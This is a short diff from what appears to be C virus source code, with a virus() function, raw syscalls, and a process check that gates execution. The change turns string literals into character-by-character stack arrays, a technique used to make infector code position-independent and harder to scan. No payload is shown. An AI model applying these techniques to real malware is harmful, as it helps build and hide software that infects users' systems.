@@ -88,12 +88,31 @@ int virus(int ac, char **av){
 }
 
 __start void print_debugging(){
-		char s[] = "DEBUGGING...\n";
-		CALL(SYS_write, 1, s, 12);
+		char s[14];
+		s[ 0] = 'D';
+		s[ 1] = 'E';
+		s[ 2] = 'B';
+		s[ 3] = 'U';
+		s[ 4] = 'G';
+		s[ 5] = 'G';
+		s[ 6] = 'I';
+		s[ 7] = 'N';
+		s[ 8] = 'G';
+		s[ 9] = '.';
+		s[10] = '.';
+		s[11] = '.';
+		s[12] = '\n';
+		s[13] = '\0';
+		CALL(SYS_write, 1, s, 13);
 }
 
 __start int main(int ac, char **av){
-	char cmp[] = "test";
+	char cmp[5];
+	cmp[0] = 't';
+	cmp[1] = 'e';
+	cmp[2] = 's';
+	cmp[3] = 't';
+	cmp[4] = '\0';
 	if (checkproc(cmp) == FALSE)
 		return FALSE;
 	//key[0] ^= 0b01110010;
